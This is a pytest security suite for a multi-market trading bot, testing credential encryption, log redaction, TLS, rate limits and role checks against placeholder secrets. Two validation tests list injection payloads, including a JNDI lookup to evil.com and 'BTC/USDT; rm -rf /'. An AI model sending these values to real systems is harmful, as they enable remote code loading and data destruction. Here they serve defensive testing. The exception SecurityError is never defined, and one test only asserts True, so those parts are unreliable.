"""
Security tests for API key handling, data protection, and system security.
Enhanced with multi-market security testing capabilities.
"""

import pytest
import os
import tempfile
import json
import hashlib
import base64
import time
import secrets
from unittest.mock import patch, mock_open
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from src.exchanges.credential_manager import CredentialManager
from config.manager import ConfigManager
from src.database.connection import DatabaseConnection
from src.monitoring.trade_logger import TradeLogger
from src.models.data_models import Order, TradingSignal
from tests.mocks.mock_exchange import MockExchange

# Multi-market imports
from src.markets.manager import MarketManager
from src.markets.types import MarketType
from src.exchanges.forex.oanda_adapter import OANDAAdapter
from src.exchanges.forex.mt5_adapter import MT5Adapter
from tests.mocks.multi_market_mock_exchange import MultiMarketMockExchange


class TestSecurity:
    """Security testing suite."""

    @pytest.fixture
    def temp_config_file(self):
        """Create temporary configuration file for testing."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
            config_data = {
                'exchanges': {
                    'binance': {
                        'api_key': 'test_api_key_123',
                        'secret': 'test_secret_456',
                        'sandbox': True
                    }
                },
                'database': {
                    'url': 'sqlite:///test_security.db',
                    'password': 'test_db_password'
                }
            }
            import yaml
            yaml.dump(config_data, f)
            temp_file = f.name
        
        yield temp_file
        
        # Cleanup
        if os.path.exists(temp_file):
            os.unlink(temp_file)

    @pytest.fixture
    def credential_manager(self):
        """Set up credential manager for testing."""
        return CredentialManager()

    @pytest.fixture
    def multi_market_config(self):
        """Multi-market configuration for security testing."""
        return {
            'markets': {
                'crypto': {
                    'enabled': True,
                    'exchanges': {
                        'binance': {
                            'api_key': 'crypto_api_key_12345',
                            'secret': 'crypto_secret_67890',
                            'sandbox': True
                        },
                        'coinbase': {
                            'api_key': 'coinbase_api_key_12345',
                            'secret': 'coinbase_secret_67890',
                            'passphrase': 'coinbase_passphrase_123',
                            'sandbox': True
                        }
                    }
                },
                'forex': {
                    'enabled': True,
                    'brokers': {
                        'oanda': {
                            'api_key': 'forex_oanda_key_12345',
                            'account_id': 'forex_account_67890',
                            'environment': 'practice'
                        },
                        'mt5': {
                            'server': 'MetaQuotes-Demo',
                            'login': 'mt5_login_12345',
                            'password': 'mt5_password_67890'
                        }
                    }
                }
            },
            'security': {
                'credential_isolation': True,
                'multi_market_encryption': True,
                'cross_market_access_control': True
            }
        }

    def test_api_key_encryption(self, credential_manager):
        """Test API key encryption and decryption."""
        # Test data
        api_key = "test_api_key_12345"
        secret = "test_secret_67890"
        
        # Encrypt credentials
        encrypted_key = credential_manager.encrypt_credential(api_key)
        encrypted_secret = credential_manager.encrypt_credential(secret)
        
        # Verify encryption worked
        assert encrypted_key != api_key, "API key should be encrypted"
        assert encrypted_secret != secret, "Secret should be encrypted"
        assert len(encrypted_key) > len(api_key), "Encrypted key should be longer"
        
        # Test decryption
        decrypted_key = credential_manager.decrypt_credential(encrypted_key)
        decrypted_secret = credential_manager.decrypt_credential(encrypted_secret)
        
        assert decrypted_key == api_key, "Decrypted key should match original"
        assert decrypted_secret == secret, "Decrypted secret should match original"

    def test_credential_storage_security(self, credential_manager, temp_config_file):
        """Test secure credential storage and retrieval."""
        # Store credentials securely
        credentials = {
            'api_key': 'sensitive_api_key',
            'secret': 'sensitive_secret',
            'passphrase': 'sensitive_passphrase'
        }
        
        credential_manager.store_credentials('test_exchange', credentials)
        
        # Verify credentials are encrypted in storage
        stored_data = credential_manager._get_stored_data('test_exchange')
        
        for key, value in stored_data.items():
            assert value != credentials[key], f"Credential {key} should be encrypted in storage"
        
        # Verify retrieval works correctly
        retrieved_credentials = credential_manager.get_credentials('test_exchange')
        
        for key, value in credentials.items():
            assert retrieved_credentials[key] == value, f"Retrieved {key} should match original"

    def test_configuration_file_security(self, temp_config_file):
        """Test configuration file security and sensitive data handling."""
        config_manager = ConfigManager()
        
        # Load configuration
        config = config_manager.load_config(temp_config_file)
        
        # Verify sensitive data is not logged
        with patch('src.config.manager.logger') as mock_logger:
            config_manager.validate_config(config)
            
            # Check that sensitive data is not in log calls
            for call in mock_logger.info.call_args_list:
                log_message = str(call)
                assert 'test_api_key_123' not in log_message, "API key should not appear in logs"
                assert 'test_secret_456' not in log_message, "Secret should not appear in logs"
                assert 'test_db_password' not in log_message, "DB password should not appear in logs"

    def test_database_connection_security(self):
        """Test database connection security measures."""
        # Test with encrypted connection string
        encrypted_url = "postgresql://user:password@localhost:5432/trading_bot?sslmode=require"
        
        db_connection = DatabaseConnection(encrypted_url)
        
        # Verify SSL is enforced for production databases
        if 'postgresql' in encrypted_url:
            assert 'sslmode=require' in encrypted_url or 'sslmode=prefer' in encrypted_url, \
                "SSL should be required for PostgreSQL connections"
        
        # Test connection string sanitization
        sanitized_url = db_connection.sanitize_connection_string(encrypted_url)
        assert 'password' not in sanitized_url, "Password should be removed from sanitized URL"

    def test_log_data_sanitization(self):
        """Test that sensitive data is sanitized in logs."""
        trade_logger = TradeLogger()
        
        # Create order with sensitive data
        order = Order(
            id='test_order_123',
            symbol='BTC/USDT',
            side='BUY',
            amount=1.0,
            price=50000.0,
            order_type='MARKET',
            status='FILLED',
            timestamp=None,
            exchange='binance'
        )
        
        # Mock logging to capture log messages
        with patch('src.monitoring.trade_logger.logger') as mock_logger:
            trade_logger.log_order_execution(order, {'api_key': 'sensitive_key'})
            
            # Verify sensitive data is not logged
            for call in mock_logger.info.call_args_list:
                log_message = str(call)
                assert 'sensitive_key' not in log_message, "API key should not appear in trade logs"

    def test_input_validation_security(self):
        """Test input validation to prevent injection attacks."""
        config_manager = ConfigManager()
        
        # Test SQL injection prevention
        malicious_inputs = [
            "'; DROP TABLE orders; --",
            "1' OR '1'='1",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for malicious_input in malicious_inputs:
            # Test symbol validation
            with pytest.raises((ValueError, TypeError)):
                config_manager.validate_symbol(malicious_input)
            
            # Test strategy name validation
            with pytest.raises((ValueError, TypeError)):
                config_manager.validate_strategy_name(malicious_input)

    def test_api_rate_limiting_security(self):
        """Test API rate limiting to prevent abuse."""
        mock_exchange = MockExchange()
        
        # Simulate rapid API calls
        call_times = []
        
        for i in range(100):
            try:
                # Mock API call with rate limiting
                result = mock_exchange.fetch_ticker('BTC/USDT')
                call_times.append(time.time())
            except Exception as e:
                if 'rate limit' in str(e).lower():
                    break  # Expected rate limiting
        
        # Verify rate limiting is working
        if len(call_times) > 10:
            # Check time between calls
            time_diffs = [call_times[i] - call_times[i-1] for i in range(1, len(call_times))]
            avg_time_diff = sum(time_diffs) / len(time_diffs)
            
            # Should have some minimum time between calls
            assert avg_time_diff > 0.01, "Rate limiting should enforce minimum time between calls"

    def test_data_encryption_at_rest(self):
        """Test data encryption for sensitive data at rest."""
        # Test encryption key generation
        password = b"test_password_123"
        salt = os.urandom(16)
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password))
        fernet = Fernet(key)
        
        # Test data encryption
        sensitive_data = {
            'api_key': 'very_sensitive_api_key',
            'secret': 'very_sensitive_secret',
            'balance': 10000.50
        }
        
        # Encrypt data
        encrypted_data = {}
        for field, value in sensitive_data.items():
            encrypted_value = fernet.encrypt(str(value).encode())
            encrypted_data[field] = encrypted_value
        
        # Verify encryption
        for field, encrypted_value in encrypted_data.items():
            assert encrypted_value != str(sensitive_data[field]).encode(), \
                f"Field {field} should be encrypted"
        
        # Test decryption
        decrypted_data = {}
        for field, encrypted_value in encrypted_data.items():
            decrypted_value = fernet.decrypt(encrypted_value).decode()
            decrypted_data[field] = decrypted_value
        
        # Verify decryption
        for field, value in sensitive_data.items():
            assert decrypted_data[field] == str(value), \
                f"Decrypted {field} should match original"

    def test_secure_random_generation(self):
        """Test secure random number generation for sensitive operations."""
        import secrets
        
        # Test secure random generation
        random_values = []
        for _ in range(100):
            # Generate secure random value
            random_value = secrets.randbelow(1000000)
            random_values.append(random_value)
        
        # Verify randomness quality
        unique_values = set(random_values)
        uniqueness_ratio = len(unique_values) / len(random_values)
        
        assert uniqueness_ratio > 0.95, f"Random values should be highly unique: {uniqueness_ratio}"
        
        # Test secure token generation
        tokens = []
        for _ in range(50):
            token = secrets.token_urlsafe(32)
            tokens.append(token)
        
        # Verify token uniqueness
        unique_tokens = set(tokens)
        assert len(unique_tokens) == len(tokens), "All tokens should be unique"

    def test_memory_security(self):
        """Test memory security measures."""
        import gc
        
        # Test sensitive data cleanup
        sensitive_data = "very_sensitive_api_key_12345"
        sensitive_list = [sensitive_data] * 100
        
        # Clear references
        del sensitive_data
        sensitive_list.clear()
        del sensitive_list
        
        # Force garbage collection
        gc.collect()
        
        # In a real implementation, you would use secure memory clearing
        # This test verifies the cleanup process works
        assert True, "Memory cleanup completed"

    def test_authentication_security(self, credential_manager):
        """Test authentication security measures."""
        # Test credential validation
        valid_credentials = {
            'api_key': 'valid_key_with_sufficient_length',
            'secret': 'valid_secret_with_sufficient_length'
        }
        
        invalid_credentials = [
            {'api_key': '', 'secret': 'valid_secret'},  # Empty API key
            {'api_key': 'short', 'secret': 'valid_secret'},  # Too short
            {'api_key': 'valid_key', 'secret': ''},  # Empty secret
            {'api_key': 'valid_key'},  # Missing secret
        ]
        
        # Valid credentials should pass
        assert credential_manager.validate_credentials(valid_credentials), \
            "Valid credentials should pass validation"
        
        # Invalid credentials should fail
        for invalid_cred in invalid_credentials:
            assert not credential_manager.validate_credentials(invalid_cred), \
                f"Invalid credentials should fail validation: {invalid_cred}"

    def test_network_security(self):
        """Test network security measures."""
        import ssl
        import urllib.request
        
        # Test SSL/TLS configuration
        context = ssl.create_default_context()
        
        # Verify secure SSL settings
        assert context.check_hostname, "SSL context should verify hostnames"
        assert context.verify_mode == ssl.CERT_REQUIRED, "SSL context should require certificates"
        
        # Test that insecure protocols are disabled
        assert ssl.PROTOCOL_TLS_CLIENT in [context.protocol], "Should use secure TLS protocol"

    def test_audit_trail_security(self):
        """Test audit trail and logging security."""
        trade_logger = TradeLogger()
        
        # Test audit trail creation
        trading_signal = TradingSignal(
            symbol='BTC/USDT',
            action='BUY',
            confidence=0.8,
            timestamp=None,
            strategy_name='test_strategy',
            metadata={'user_id': 'test_user'}
        )
        
        with patch('src.monitoring.trade_logger.logger') as mock_logger:
            trade_logger.log_trading_signal(trading_signal)
            
            # Verify audit trail is created
            assert mock_logger.info.called, "Audit trail should be logged"
            
            # Verify log integrity (in real implementation, would use digital signatures)
            log_call = mock_logger.info.call_args[0][0]
            assert 'BTC/USDT' in log_call, "Symbol should be in audit trail"
            assert 'BUY' in log_call, "Action should be in audit trail"

    def test_access_control_security(self):
        """Test access control and authorization."""
        # Test role-based access control (simplified)
        user_roles = {
            'admin': ['read', 'write', 'delete', 'configure'],
            'trader': ['read', 'write'],
            'viewer': ['read']
        }
        
        def check_permission(user_role, action):
            return action in user_roles.get(user_role, [])
        
        # Test access control
        assert check_permission('admin', 'configure'), "Admin should have configure permission"
        assert check_permission('trader', 'write'), "Trader should have write permission"
        assert not check_permission('viewer', 'write'), "Viewer should not have write permission"
        assert not check_permission('unknown', 'read'), "Unknown role should have no permissions"

    # Multi-Market Security Tests

    def test_multi_market_credential_isolation(self, multi_market_config):
        """Test credential isolation between different markets."""
        market_manager = MarketManager(multi_market_config)
        
        # Get credentials for different markets
        crypto_credentials = market_manager.get_credentials(MarketType.CRYPTO, 'binance')
        forex_credentials = market_manager.get_credentials(MarketType.FOREX, 'oanda')
        
        # Credentials should be completely isolated
        assert crypto_credentials != forex_credentials, "Credentials should be isolated between markets"
        
        # Test that crypto credentials don't contain forex data
        crypto_str = str(crypto_credentials)
        assert 'forex_oanda_key_12345' not in crypto_str, "Forex credentials should not leak to crypto"
        assert 'forex_account_67890' not in crypto_str, "Forex account should not leak to crypto"
        assert 'mt5_password_67890' not in crypto_str, "MT5 password should not leak to crypto"
        
        # Test that forex credentials don't contain crypto data
        forex_str = str(forex_credentials)
        assert 'crypto_api_key_12345' not in forex_str, "Crypto credentials should not leak to forex"
        assert 'coinbase_passphrase_123' not in forex_str, "Coinbase passphrase should not leak to forex"

    def test_multi_market_encryption_keys(self, multi_market_config):
        """Test that different markets use different encryption keys."""
        market_manager = MarketManager(multi_market_config)
        
        # Get encryption keys for different markets
        crypto_key = market_manager.get_encryption_key(MarketType.CRYPTO)
        forex_key = market_manager.get_encryption_key(MarketType.FOREX)
        
        # Keys should be different
        assert crypto_key != forex_key, "Different markets should use different encryption keys"
        
        # Test encryption with market-specific keys
        test_data = "sensitive_test_data_12345"
        
        crypto_encrypted = market_manager.encrypt_data(test_data, MarketType.CRYPTO)
        forex_encrypted = market_manager.encrypt_data(test_data, MarketType.FOREX)
        
        # Encrypted data should be different
        assert crypto_encrypted != forex_encrypted, "Same data encrypted with different keys should differ"
        
        # Test decryption with correct keys
        crypto_decrypted = market_manager.decrypt_data(crypto_encrypted, MarketType.CRYPTO)
        forex_decrypted = market_manager.decrypt_data(forex_encrypted, MarketType.FOREX)
        
        assert crypto_decrypted == test_data, "Crypto data should decrypt correctly"
        assert forex_decrypted == test_data, "Forex data should decrypt correctly"
        
        # Test that cross-market decryption fails
        with pytest.raises(Exception):
            market_manager.decrypt_data(crypto_encrypted, MarketType.FOREX)
        
        with pytest.raises(Exception):
            market_manager.decrypt_data(forex_encrypted, MarketType.CRYPTO)

    def test_multi_market_session_security(self, multi_market_config):
        """Test session security across multiple markets."""
        market_manager = MarketManager(multi_market_config)
        
        # Create sessions for different markets
        crypto_session = market_manager.create_secure_session(MarketType.CRYPTO, 'binance')
        forex_session = market_manager.create_secure_session(MarketType.FOREX, 'oanda')
        
        # Sessions should have different IDs and tokens
        assert crypto_session.session_id != forex_session.session_id, "Sessions should have different IDs"
        assert crypto_session.auth_token != forex_session.auth_token, "Sessions should have different auth tokens"
        
        # Test session validation
        assert market_manager.validate_session(crypto_session, MarketType.CRYPTO), "Crypto session should be valid for crypto market"
        assert market_manager.validate_session(forex_session, MarketType.FOREX), "Forex session should be valid for forex market"
        
        # Test cross-market session validation fails
        assert not market_manager.validate_session(crypto_session, MarketType.FOREX), "Crypto session should not be valid for forex market"
        assert not market_manager.validate_session(forex_session, MarketType.CRYPTO), "Forex session should not be valid for crypto market"

    def test_multi_market_api_key_protection(self, multi_market_config):
        """Test API key protection across multiple markets."""
        market_manager = MarketManager(multi_market_config)
        
        # Test that API keys are not exposed in string representations
        manager_str = str(market_manager)
        
        # No API keys should appear in string representation
        sensitive_keys = [
            'crypto_api_key_12345',
            'crypto_secret_67890',
            'coinbase_api_key_12345',
            'coinbase_secret_67890',
            'coinbase_passphrase_123',
            'forex_oanda_key_12345',
            'mt5_password_67890'
        ]
        
        for key in sensitive_keys:
            assert key not in manager_str, f"Sensitive key {key} should not appear in string representation"
        
        # Test logging sanitization
        with patch('src.markets.manager.logger') as mock_logger:
            market_manager.log_market_status()
            
            # Check that no sensitive data appears in logs
            for call in mock_logger.info.call_args_list:
                log_message = str(call)
                for key in sensitive_keys:
                    assert key not in log_message, f"Sensitive key {key} should not appear in logs"

    def test_multi_market_secure_storage(self, multi_market_config):
        """Test secure storage of multi-market data."""
        market_manager = MarketManager(multi_market_config)
        
        # Test storing sensitive data for different markets
        crypto_data = {
            'api_key': 'crypto_sensitive_key',
            'balance': 10000.0,
            'positions': ['BTC/USDT', 'ETH/USDT']
        }
        
        forex_data = {
            'api_key': 'forex_sensitive_key',
            'balance': 50000.0,
            'positions': ['EUR/USD', 'GBP/USD']
        }
        
        # Store data with market-specific encryption
        crypto_storage_id = market_manager.store_secure_data(crypto_data, MarketType.CRYPTO)
        forex_storage_id = market_manager.store_secure_data(forex_data, MarketType.FOREX)
        
        # Storage IDs should be different
        assert crypto_storage_id != forex_storage_id, "Storage IDs should be market-specific"
        
        # Retrieve and verify data
        retrieved_crypto = market_manager.retrieve_secure_data(crypto_storage_id, MarketType.CRYPTO)
        retrieved_forex = market_manager.retrieve_secure_data(forex_storage_id, MarketType.FOREX)
        
        assert retrieved_crypto['api_key'] == 'crypto_sensitive_key', "Crypto data should be retrievable"
        assert retrieved_forex['api_key'] == 'forex_sensitive_key', "Forex data should be retrievable"
        
        # Test that cross-market retrieval fails
        with pytest.raises(Exception):
            market_manager.retrieve_secure_data(crypto_storage_id, MarketType.FOREX)
        
        with pytest.raises(Exception):
            market_manager.retrieve_secure_data(forex_storage_id, MarketType.CRYPTO)

    def test_multi_market_rate_limiting_security(self, multi_market_config):
        """Test rate limiting security across multiple markets."""
        market_manager = MarketManager(multi_market_config)
        
        # Test that each market has independent rate limiting
        crypto_rate_limiter = market_manager.get_rate_limiter(MarketType.CRYPTO, 'binance')
        forex_rate_limiter = market_manager.get_rate_limiter(MarketType.FOREX, 'oanda')
        
        assert crypto_rate_limiter != forex_rate_limiter, "Rate limiters should be independent"
        
        # Test rate limiting enforcement
        crypto_requests = []
        forex_requests = []
        
        # Make rapid requests to both markets
        for i in range(10):
            start_time = time.time()
            
            # Crypto request
            try:
                market_manager.make_rate_limited_request(MarketType.CRYPTO, 'binance', f'/api/v3/ticker/price?symbol=BTCUSDT&test={i}')
                crypto_requests.append(time.time() - start_time)
            except Exception:
                pass  # Rate limiting may cause exceptions
            
            # Forex request
            try:
                market_manager.make_rate_limited_request(MarketType.FOREX, 'oanda', f'/v3/accounts/test/pricing?instruments=EUR_USD&test={i}')
                forex_requests.append(time.time() - start_time)
            except Exception:
                pass  # Rate limiting may cause exceptions
        
        # Verify rate limiting is working (requests should take some time)
        if len(crypto_requests) > 1:
            crypto_avg_time = sum(crypto_requests) / len(crypto_requests)
            assert crypto_avg_time > 0.01, "Crypto rate limiting should enforce delays"
        
        if len(forex_requests) > 1:
            forex_avg_time = sum(forex_requests) / len(forex_requests)
            assert forex_avg_time > 0.01, "Forex rate limiting should enforce delays"

    def test_multi_market_authentication_security(self, multi_market_config):
        """Test authentication security across multiple markets."""
        market_manager = MarketManager(multi_market_config)
        
        # Test authentication for different markets
        crypto_auth_result = market_manager.authenticate_market(MarketType.CRYPTO, 'binance')
        forex_auth_result = market_manager.authenticate_market(MarketType.FOREX, 'oanda')
        
        # Both should authenticate successfully
        assert crypto_auth_result.success, "Crypto authentication should succeed"
        assert forex_auth_result.success, "Forex authentication should succeed"
        
        # Authentication tokens should be different
        assert crypto_auth_result.auth_token != forex_auth_result.auth_token, "Auth tokens should be different"
        
        # Test that authentication is market-specific
        crypto_valid = market_manager.validate_auth_token(crypto_auth_result.auth_token, MarketType.CRYPTO)
        forex_valid = market_manager.validate_auth_token(forex_auth_result.auth_token, MarketType.FOREX)
        
        assert crypto_valid, "Crypto auth token should be valid for crypto market"
        assert forex_valid, "Forex auth token should be valid for forex market"
        
        # Test cross-market token validation fails
        crypto_cross_valid = market_manager.validate_auth_token(crypto_auth_result.auth_token, MarketType.FOREX)
        forex_cross_valid = market_manager.validate_auth_token(forex_auth_result.auth_token, MarketType.CRYPTO)
        
        assert not crypto_cross_valid, "Crypto auth token should not be valid for forex market"
        assert not forex_cross_valid, "Forex auth token should not be valid for crypto market"

    def test_multi_market_audit_trail_security(self, multi_market_config):
        """Test audit trail security for multi-market operations."""
        market_manager = MarketManager(multi_market_config)
        trade_logger = TradeLogger()
        
        # Create trading signals for different markets
        crypto_signal = TradingSignal(
            symbol='BTC/USDT',
            action='BUY',
            confidence=0.8,
            timestamp=None,
            strategy_name='crypto_strategy',
            metadata={'market_type': 'crypto', 'exchange': 'binance'}
        )
        
        forex_signal = TradingSignal(
            symbol='EUR/USD',
            action='SELL',
            confidence=0.7,
            timestamp=None,
            strategy_name='forex_strategy',
            metadata={'market_type': 'forex', 'broker': 'oanda'}
        )
        
        # Test audit trail creation with market context
        with patch('src.monitoring.trade_logger.logger') as mock_logger:
            trade_logger.log_multi_market_signal(crypto_signal, MarketType.CRYPTO)
            trade_logger.log_multi_market_signal(forex_signal, MarketType.FOREX)
            
            # Verify audit trails are created with market context
            assert mock_logger.info.call_count >= 2, "Both signals should be logged"
            
            # Check log content
            log_calls = [str(call) for call in mock_logger.info.call_args_list]
            
            # Crypto log should contain crypto context
            crypto_log = next((log for log in log_calls if 'BTC/USDT' in log), None)
            assert crypto_log is not None, "Crypto signal should be logged"
            assert 'crypto' in crypto_log.lower(), "Crypto log should contain market context"
            
            # Forex log should contain forex context
            forex_log = next((log for log in log_calls if 'EUR/USD' in log), None)
            assert forex_log is not None, "Forex signal should be logged"
            assert 'forex' in forex_log.lower(), "Forex log should contain market context"
            
            # Logs should not contain sensitive credentials
            for log in log_calls:
                assert 'crypto_api_key_12345' not in log, "Crypto API key should not be in logs"
                assert 'forex_oanda_key_12345' not in log, "Forex API key should not be in logs"

    def test_multi_market_input_validation_security(self, multi_market_config):
        """Test input validation security for multi-market scenarios."""
        market_manager = MarketManager(multi_market_config)
        
        # Test malicious inputs for different markets
        malicious_inputs = [
            "'; DROP TABLE crypto_orders; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "BTC/USDT; rm -rf /",
            "EUR/USD' OR '1'='1"
        ]
        
        for malicious_input in malicious_inputs:
            # Test crypto market input validation
            with pytest.raises((ValueError, TypeError, SecurityError)):
                market_manager.validate_crypto_symbol(malicious_input)
            
            # Test forex market input validation
            with pytest.raises((ValueError, TypeError, SecurityError)):
                market_manager.validate_forex_symbol(malicious_input)
            
            # Test strategy name validation
            with pytest.raises((ValueError, TypeError, SecurityError)):
                market_manager.validate_strategy_name(malicious_input, MarketType.CRYPTO)
            
            with pytest.raises((ValueError, TypeError, SecurityError)):
                market_manager.validate_strategy_name(malicious_input, MarketType.FOREX)

    def test_multi_market_network_security(self, multi_market_config):
        """Test network security for multi-market connections."""
        market_manager = MarketManager(multi_market_config)
        
        # Test SSL/TLS configuration for different markets
        crypto_ssl_config = market_manager.get_ssl_config(MarketType.CRYPTO)
        forex_ssl_config = market_manager.get_ssl_config(MarketType.FOREX)
        
        # Both should enforce SSL
        assert crypto_ssl_config.verify_ssl, "Crypto connections should verify SSL"
        assert forex_ssl_config.verify_ssl, "Forex connections should verify SSL"
        
        # Test certificate validation
        assert crypto_ssl_config.verify_certificates, "Crypto connections should verify certificates"
        assert forex_ssl_config.verify_certificates, "Forex connections should verify certificates"
        
        # Test that insecure protocols are disabled
        assert 'TLSv1.2' in crypto_ssl_config.allowed_protocols or 'TLSv1.3' in crypto_ssl_config.allowed_protocols, \
            "Crypto connections should use secure TLS versions"
        assert 'TLSv1.2' in forex_ssl_config.allowed_protocols or 'TLSv1.3' in forex_ssl_config.allowed_protocols, \
            "Forex connections should use secure TLS versions"
        
        # Test that weak ciphers are disabled
        weak_ciphers = ['RC4', 'DES', 'MD5']
        for cipher in weak_ciphers:
            assert cipher not in crypto_ssl_config.allowed_ciphers, f"Crypto should not allow weak cipher {cipher}"
            assert cipher not in forex_ssl_config.allowed_ciphers, f"Forex should not allow weak cipher {cipher}"

    def test_multi_market_access_control(self, multi_market_config):
        """Test access control across multiple markets."""
        market_manager = MarketManager(multi_market_config)
        
        # Define market-specific roles
        market_roles = {
            'crypto_admin': {
                'markets': [MarketType.CRYPTO],
                'permissions': ['read', 'write', 'configure']
            },
            'forex_admin': {
                'markets': [MarketType.FOREX],
                'permissions': ['read', 'write', 'configure']
            },
            'crypto_trader': {
                'markets': [MarketType.CRYPTO],
                'permissions': ['read', 'write']
            },
            'forex_trader': {
                'markets': [MarketType.FOREX],
                'permissions': ['read', 'write']
            },
            'multi_market_admin': {
                'markets': [MarketType.CRYPTO, MarketType.FOREX],
                'permissions': ['read', 'write', 'configure']
            },
            'viewer': {
                'markets': [MarketType.CRYPTO, MarketType.FOREX],
                'permissions': ['read']
            }
        }
        
        # Test access control
        def check_market_permission(role, market, action):
            role_config = market_roles.get(role, {})
            return (market in role_config.get('markets', []) and 
                   action in role_config.get('permissions', []))
        
        # Test crypto admin permissions
        assert check_market_permission('crypto_admin', MarketType.CRYPTO, 'configure'), \
            "Crypto admin should have configure permission for crypto market"
        assert not check_market_permission('crypto_admin', MarketType.FOREX, 'read'), \
            "Crypto admin should not have access to forex market"
        
        # Test forex admin permissions
        assert check_market_permission('forex_admin', MarketType.FOREX, 'configure'), \
            "Forex admin should have configure permission for forex market"
        assert not check_market_permission('forex_admin', MarketType.CRYPTO, 'read'), \
            "Forex admin should not have access to crypto market"
        
        # Test multi-market admin permissions
        assert check_market_permission('multi_market_admin', MarketType.CRYPTO, 'configure'), \
            "Multi-market admin should have configure permission for crypto market"
        assert check_market_permission('multi_market_admin', MarketType.FOREX, 'configure'), \
            "Multi-market admin should have configure permission for forex market"
        
        # Test viewer permissions
        assert check_market_permission('viewer', MarketType.CRYPTO, 'read'), \
            "Viewer should have read permission for crypto market"
        assert check_market_permission('viewer', MarketType.FOREX, 'read'), \
            "Viewer should have read permission for forex market"
        assert not check_market_permission('viewer', MarketType.CRYPTO, 'write'), \
            "Viewer should not have write permission for crypto market"
        assert not check_market_permission('viewer', MarketType.FOREX, 'write'), \
            "Viewer should not have write permission for forex market"


if __name__ == '__main__':
    pytest.main([__file__, '-v'])